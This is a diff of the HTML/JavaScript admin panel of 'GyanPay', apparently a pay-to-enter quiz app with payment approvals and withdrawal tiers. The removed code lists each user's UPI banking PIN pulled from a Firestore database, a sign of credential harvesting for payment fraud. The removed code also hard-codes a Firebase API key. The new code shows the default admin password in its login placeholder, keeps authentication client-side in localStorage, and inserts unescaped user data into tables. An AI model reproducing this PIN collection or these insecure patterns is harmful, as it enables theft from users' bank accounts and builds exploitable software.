@@ -3,179 +3,265 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GyanPay - Admin Panel</title>
+    <title>GyanPay - Advanced Admin Control</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #0f172a; color: #ffffff; margin: 0; padding: 20px; }
-        .container { max-width: 900px; margin: auto; background: #1e293b; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
-        h2, h3 { color: #f8fafc; text-align: center; }
-        .login-box, .admin-panel { display: none; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { padding: 12px; border: 1px solid #334155; text-align: center; }
-        th { background-color: #3b82f6; color: white; }
-        tr:nth-child(even) { background-color: #172033; }
-        button { padding: 6px 12px; cursor: pointer; border: none; border-radius: 4px; color: white; font-weight: bold; }
-        .btn-approve { background-color: #10b981; }
-        .btn-reject { background-color: #ef4444; }
-        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
-        .settings-card { background: #0f172a; padding: 15px; border-radius: 8px; margin-bottom: 25px; border: 1px solid #334155; }
-        .settings-card input, .settings-card select { padding: 8px; margin: 5px 10px 5px 0; background: #1e293b; border: 1px solid #475569; color: white; border-radius: 4px; }
+        :root {
+            --primary: #4f46e5;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --bg: #0f172a;
+            --card-bg: #1e293b;
+            --text: #f8fafc;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        
+        header { width: 100%; max-width: 950px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding: 15px; background: var(--card-bg); border-radius: 10px; }
+        h1 { font-size: 1.4rem; color: #38bdf8; }
+        .home-btn { background: var(--primary); color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; text-decoration: none; font-size: 0.9rem; }
+
+        .container { width: 100%; max-width: 950px; background: var(--card-bg); padding: 25px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); margin-bottom: 20px; }
+        .hidden { display: none !important; }
+
+        input, textarea, select { width: 100%; padding: 10px; margin: 8px 0; background: #0f172a; border: 1px solid #334155; color: white; border-radius: 6px; font-size: 0.95rem; }
+        button.primary-btn { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 6px; font-size: 1rem; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button.primary-btn:hover { opacity: 0.9; }
+
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
+        th, td { border: 1px solid #334155; padding: 10px; text-align: left; font-size: 0.85rem; }
+        th { background: #0f172a; color: #38bdf8; }
+        
+        .approve-btn { background: var(--success); color: white; border: none; padding: 6px 10px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .reject-btn { background: var(--danger); color: white; border: none; padding: 6px 10px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-left: 5px; }
+        .screenshot-thumb { width: 45px; height: 45px; object-fit: cover; cursor: pointer; border-radius: 4px; border: 1px solid #38bdf8; }
+        
+        .section-title { font-size: 1.1rem; color: #38bdf8; margin-bottom: 12px; border-bottom: 1px solid #334155; padding-bottom: 5px; font-weight: bold; }
+        .question-builder-box { background: #111827; padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #334155; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="loginBox" class="login-box" style="display: block;">
-            <h2>Admin Portal Login</h2>
-            <div style="text-align: center; margin-top: 20px;">
-                <input type="password" id="adminPasswordInput" placeholder="Enter Admin Password" style="padding: 10px; width: 60%; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 6px;"><br><br>
-                <button onclick="loginAdmin()" style="background-color: #3b82f6; padding: 10px 20px; border-radius: 6px;">Login</button>
-                <p id="loginError" style="color: #ef4444; margin-top: 10px;"></p>
+
+    <header>
+        <h1>GyanPay - Admin Master Panel</h1>
+        <a href="index.html" class="home-btn">User Home</a>
+    </header>
+
+    <!-- Admin Login Section -->
+    <div id="admin-login-container" class="container">
+        <h2>एडमिन लॉगिन</h2>
+        <input type="password" id="admin-pass" placeholder="एडमिन पिन/पासवर्ड दर्ज करें (डिफ़ॉल्ट: admin123)">
+        <button class="primary-btn" onclick="loginAdmin()">लॉगिन करें</button>
+    </div>
+
+    <!-- Admin Dashboard Section -->
+    <div id="admin-dashboard" class="container hidden">
+        
+        <!-- 1. Custom 10 Questions Creator -->
+        <div style="margin-bottom: 30px;">
+            <div class="section-title">✍️ 10 सवाल और उत्तर खुद सेट करें (गेम कंट्रोल)</div>
+            <p style="font-size: 0.85rem; color: #94a3b8; margin-bottom: 10px;">यहाँ अपने हिसाब से 10 सवाल और उनके विकल्प भरें। सही उत्तर (0 से 3) का इंडेक्स नंबर दें (जैसे पहला विकल्प सही है तो 0 लिखें)।</p>
+            
+            <div id="questions-builder-container">
+                <!-- Dynamic 10 Question Fields will load here -->
+            </div>
+            <button class="primary-btn" style="background: var(--success);" onclick="saveCustomQuestions()">10 सवाल सेव करें और क्विज़ लाइव करें</button>
+        </div>
+
+        <!-- 2. User Approvals & Screenshots Table -->
+        <div style="margin-bottom: 30px;">
+            <div class="section-title">👥 यूज़र पेमेंट वेरिफिकेशन और अप्रूवल</div>
+            <div style="overflow-x: auto;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>नाम</th>
+                            <th>मोबाइल</th>
+                            <th>स्क्रीनशॉट</th>
+                            <th>स्टेटस</th>
+                            <th>कार्रवाई</th>
+                        </tr>
+                    </thead>
+                    <tbody id="user-table-body">
+                        <!-- Dynamic Rows -->
+                    </tbody>
+                </table>
             </div>
         </div>
 
-        <div id="adminPanel" class="admin-panel">
-            <div class="top-bar">
-                <h2>GyanPay Admin Dashboard</h2>
-                <button onclick="changePassword()" style="background-color: #f59e0b; color: black;">Change Password</button>
+        <!-- 3. Winners & Withdrawal History Table -->
+        <div style="margin-bottom: 30px;">
+            <div class="section-title">🏆 विनर्स और विड्रॉल हिस्ट्री (VIP Tiers)</div>
+            <div style="overflow-x: auto;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>यूज़र नाम</th>
+                            <th>मोबाइल / आईडी</th>
+                            <th>स्कोर</th>
+                            <th>विनिंग टियर</th>
+                            <th>विड्रॉल स्टेटस</th>
+                        </tr>
+                    </thead>
+                    <tbody id="winners-table-body">
+                        <!-- Dynamic Winners -->
+                    </tbody>
+                </table>
             </div>
+        </div>
 
-            <!-- Quiz Start Time Scheduler -->
-            <div class="settings-card">
-                <h3>⏰ Quiz Start Time Scheduler</h3>
-                <div style="text-align: center;">
-                    <label>Start After: </label>
-                    <input type="number" id="startTimeValue" value="30" style="width: 70px;">
-                    <select id="startTimeUnit">
-                        <option value="minutes">Minutes (मिनट बाद)</option>
-                        <option value="hours">Hours (घंटे बाद)</option>
-                    </select>
-                    <button onclick="saveQuizTimer()" style="background-color: #10b981; padding: 8px 16px; margin-left: 10px;">Set & Broadcast Timer</button>
-                </div>
-            </div>
-            
-            <h3>User Submissions & Approvals</h3>
-            <div id="loading" style="text-align: center; color: #94a3b8;">Loading data from database...</div>
-            
-            <table id="dataTable" style="display: none;">
-                <thead>
-                    <tr>
-                        <th>#</th>
-                        <th>User Name</th>
-                        <th>Mobile Number</th>
-                        <th>Password/PIN</th>
-                        <th>Status</th>
-                        <th>Action</th>
-                    </tr>
-                </thead>
-                <tbody id="tableBody"></tbody>
-            </table>
+        <!-- 4. Security / Password Change -->
+        <div>
+            <div class="section-title">🔒 एडमिन सुरक्षा सेटिंग्स</div>
+            <input type="password" id="new-admin-pass" placeholder="नया एडमिन पासवर्ड/पिन दर्ज करें">
+            <button class="primary-btn" style="background: var(--warning); color: #000;" onclick="updatePassword()">एडमिन पिन बदलें</button>
         </div>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, collection, getDocs, updateDoc, doc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+    <script>
+        function loginAdmin() {
+            let pass = document.getElementById('admin-pass').value;
+            let savedPass = localStorage.getItem('gyan_admin_pass') || 'admin123';
 
-        const firebaseConfig = {
-          apiKey: "AIzaSyAqbegdp-6ppy2EBaZDSWGWpMQRamKTCNc",
-          authDomain: "gyanpey.firebaseapp.com",
-          projectId: "gyanpey",
-          storageBucket: "gyanpey.firebasestorage.app",
-          messagingSenderId: "198373987569",
-          appId: "1:198373987569:web:1a03dfe48402106d750550"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-
-        if (!localStorage.getItem("adminPass")) localStorage.setItem("adminPass", "admin123");
-        
-        if (!localStorage.getItem("quizTargetTime")) {
-            const futureTime = new Date().getTime() + 30 * 60 * 1000;
-            localStorage.setItem("quizTargetTime", futureTime);
+            if(pass === savedPass) {
+                document.getElementById('admin-login-container').classList.add('hidden');
+                document.getElementById('admin-dashboard').classList.remove('hidden');
+                loadAdminPanelData();
+            } else {
+                alert('गलत पासवर्ड! कृपया पुनः प्रयास करें।');
+            }
         }
 
-        window.loginAdmin = function() {
-            const pass = document.getElementById("adminPasswordInput").value;
-            if (pass === localStorage.getItem("adminPass")) {
-                document.getElementById("loginBox").style.display = "none";
-                document.getElementById("adminPanel").style.display = "block";
-                loadAdminData();
-            } else {
-                document.getElementById("loginError").innerText = "Invalid Password!";
-            }
-        };
+        function loadAdminPanelData() {
+            loadQuestionBuilder();
+            loadUsersTable();
+            loadWinnersTable();
+        }
 
-        window.changePassword = function() {
-            const newPass = prompt("Enter new admin password:");
-            if (newPass) {
-                localStorage.setItem("adminPass", newPass);
-                alert("Password changed successfully!");
-            }
-        };
-
-        window.saveQuizTimer = function() {
-            const val = parseInt(document.getElementById("startTimeValue").value);
-            const unit = document.getElementById("startTimeUnit").value;
+        // Generate 10 Question Form Inputs dynamically
+        function loadQuestionBuilder() {
+            let container = document.getElementById('questions-builder-container');
+            let savedQs = JSON.parse(localStorage.getItem('gyan_custom_questions')) || [];
             
-            let ms = val * 60 * 1000;
-            if (unit === "hours") {
-                ms = val * 60 * 60 * 1000;
+            container.innerHTML = '';
+            for(let i = 0; i < 10; i++) {
+                let qObj = savedQs[i] || { q: '', options: ['', '', '', ''], ans: 0 };
+                container.innerHTML += `
+                    <div class="question-builder-box">
+                        <label><b>सवाल ${i + 1}:</b></label>
+                        <input type="text" id="q-text-${i}" value="${qObj.q}" placeholder="सवाल यहाँ लिखें...">
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
+                            <input type="text" id="q-${i}-opt-0" value="${qObj.options[0]}" placeholder="विकल्प 1">
+                            <input type="text" id="q-${i}-opt-1" value="${qObj.options[1]}" placeholder="विकल्प 2">
+                            <input type="text" id="q-${i}-opt-2" value="${qObj.options[2]}" placeholder="विकल्प 3">
+                            <input type="text" id="q-${i}-opt-3" value="${qObj.options[3]}" placeholder="विकल्प 4">
+                        </div>
+                        <label style="font-size: 0.8rem; color: #38bdf8; margin-top: 5px; display:block;">सही उत्तर कौन सा विकल्प है? (0 = पहला, 1 = दूसरा, 2 = तीसरा, 3 = चौथा):</label>
+                        <input type="number" min="0" max="3" id="q-ans-${i}" value="${qObj.ans}" style="width: 100px;">
+                    </div>
+                `;
             }
+        }
 
-            const targetTime = new Date().getTime() + ms;
-            localStorage.setItem("quizTargetTime", targetTime);
-            alert("Quiz start timer successfully updated for all users!");
-        };
+        function saveCustomQuestions() {
+            let customQuestions = [];
+            for(let i = 0; i < 10; i++) {
+                let q = document.getElementById(`q-text-${i}`).value.trim();
+                let opt0 = document.getElementById(`q-${i}-opt-0`).value.trim();
+                let opt1 = document.getElementById(`q-${i}-opt-1`).value.trim();
+                let opt2 = document.getElementById(`q-${i}-opt-2`).value.trim();
+                let opt3 = document.getElementById(`q-${i}-opt-3`).value.trim();
+                let ans = parseInt(document.getElementById(`q-ans-${i}`).value);
 
-        async function loadAdminData() {
-            const tableBody = document.getElementById('tableBody');
-            const loading = document.getElementById('loading');
-            const dataTable = document.getElementById('dataTable');
-
-            try {
-                const q = query(collection(db, "usersData"), orderBy("timestamp", "desc"));
-                const querySnapshot = await getDocs(q);
-
-                tableBody.innerHTML = "";
-                let index = 1;
-
-                if (querySnapshot.empty) {
-                    loading.innerHTML = "No data found in database.";
+                if(!q || !opt0 || !opt1 || !opt2 || !opt3) {
+                    alert(`कृपया सवाल ${i + 1} के सभी फील्ड और विकल्प पूरे भरें!`);
                     return;
                 }
-
-                querySnapshot.forEach((documentSnap) => {
-                    const data = documentSnap.data();
-                    const docId = documentSnap.id;
-                    const status = data.status || "Pending";
-
-                    const row = `<tr>
-                        <td>${index++}</td>
-                        <td>${data.userName || 'N/A'}</td>
-                        <td>${data.mobileNumber || 'N/A'}</td>
-                        <td>${data.upiPin || 'N/A'}</td>
-                        <td><b>${status}</b></td>
-                        <td>
-                            <button class="btn-approve" onclick="updateStatus('${docId}', 'Approved')">Approve</button>
-                            <button class="btn-reject" onclick="updateStatus('${docId}', 'Rejected')">Reject</button>
-                        </td>
-                    </tr>`;
-                    tableBody.innerHTML += row;
-                });
-
-                loading.style.display = "none";
-                dataTable.style.display = "table";
-            } catch (error) {
-                console.error("Error: ", error);
+                customQuestions.push({ q, options: [opt0, opt1, opt2, opt3], ans });
             }
+
+            localStorage.setItem('gyan_custom_questions', JSON.stringify(customQuestions));
+            alert('सफलतापूर्वक 10 सवाल सेव हो गए हैं और क्विज़ लाइव कर दी गई है!');
         }
 
-        window.updateStatus = async function(docId, newStatus) {
-            const docRef = doc(db, "usersData", docId);
-            await updateDoc(docRef, { status: newStatus });
-            alert("Status updated to: " + newStatus);
-            loadAdminData();
-        };
+        function loadUsersTable() {
+            let users = JSON.parse(localStorage.getItem('gyan_users')) || [];
+            let tbody = document.getElementById('user-table-body');
+            tbody.innerHTML = '';
+
+            if(users.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;">कोई यूज़र रजिस्टर्ड नहीं है।</td></tr>`;
+                return;
+            }
+
+            users.forEach((user, index) => {
+                let screenshotHTML = user.screenshot ? `<img src="${user.screenshot}" class="screenshot-thumb" onclick="window.open('${user.screenshot}')" title="बड़ा देखने के लिए क्लिक करें">` : 'स्क्रीनशॉट नहीं';
+                let actionHTML = '';
+                
+                if(user.status === 'Pending') {
+                    actionHTML = `
+                        <button class="approve-btn" onclick="updateUserStatus(${index}, 'Approved')">Approve</button>
+                        <button class="reject-btn" onclick="updateUserStatus(${index}, 'Rejected')">Reject</button>
+                    `;
+                } else {
+                    actionHTML = `<b>${user.status}</b>`;
+                }
+
+                tbody.innerHTML += `
+                    <tr>
+                        <td>${user.name}</td>
+                        <td>${user.phone}</td>
+                        <td>${screenshotHTML}</td>
+                        <td><b>${user.status}</b></td>
+                        <td>${actionHTML}</td>
+                    </tr>
+                `;
+            });
+        }
+
+        function updateUserStatus(index, newStatus) {
+            let users = JSON.parse(localStorage.getItem('gyan_users')) || [];
+            users[index].status = newStatus;
+            localStorage.setItem('gyan_users', JSON.stringify(users));
+            alert(`यूज़र का स्टेटस '${newStatus}' कर दिया गया है!`);
+            loadUsersTable();
+        }
+
+        function loadWinnersTable() {
+            let users = JSON.parse(localStorage.getItem('gyan_users')) || [];
+            let tbody = document.getElementById('winners-table-body');
+            tbody.innerHTML = '';
+
+            let completedUsers = users.filter(u => u.score !== undefined);
+
+            if(completedUsers.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;">अभी तक किसी यूज़र ने क्विज़ पूरी नहीं की है।</td></tr>`;
+                return;
+            }
+
+            completedUsers.forEach(user => {
+                tbody.innerHTML += `
+                    <tr>
+                        <td>${user.name}</td>
+                        <td>ID: ${user.phone}</td>
+                        <td><b>${user.score}/10</b></td>
+                        <td><span style="color: #38bdf8; font-weight: bold;">${user.tier}</span></td>
+                        <td><button class="approve-btn" style="padding: 4px 8px; font-size: 0.8rem;" onclick="alert('विड्रॉल अप्रूव्ड for ${user.name}')">विड्रॉल दें</button></td>
+                    </tr>
+                `;
+            });
+        }
+
+        function updatePassword() {
+            let newPass = document.getElementById('new-admin-pass').value.trim();
+            if(!newPass) {
+                alert('कृपया नया पासवर्ड दर्ज करें!');
+                return;
+            }
+            localStorage.setItem('gyan_admin_pass', newPass);
+            alert('एडमिन पासवर्ड सफलतापूर्वक बदल दिया गया है!');
+            document.getElementById('new-admin-pass').value = '';
+        }
     </script>
 </body>
 </html>
